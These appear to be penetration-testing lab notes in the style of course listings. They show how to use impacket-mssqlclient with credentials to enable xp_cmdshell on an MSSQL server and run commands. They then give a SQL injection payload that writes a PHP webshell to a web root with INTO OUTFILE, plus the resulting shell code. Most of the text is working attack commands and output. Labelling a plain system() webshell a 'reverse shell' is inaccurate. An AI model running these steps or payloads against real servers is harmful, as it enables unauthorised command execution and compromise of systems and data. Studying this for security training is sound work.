```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

This is to run the **MSSQLCLIENT impacket command line to configure a remote xp_cmdshell**

EXECUTE xp_cmdshell 'whoami';
```
nt service\mssql$sqlexpress
```

This is the result from it
After seeing that you can execute commands, you can use this to insert a Webshell

' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //


> Listing 29 - Write a WebShell To Disk via INTO OUTFILE directive

The written PHP code file results in the following:

```
<? system($_REQUEST['cmd']); ?>
```

> Listing 30 - PHP reverse shell
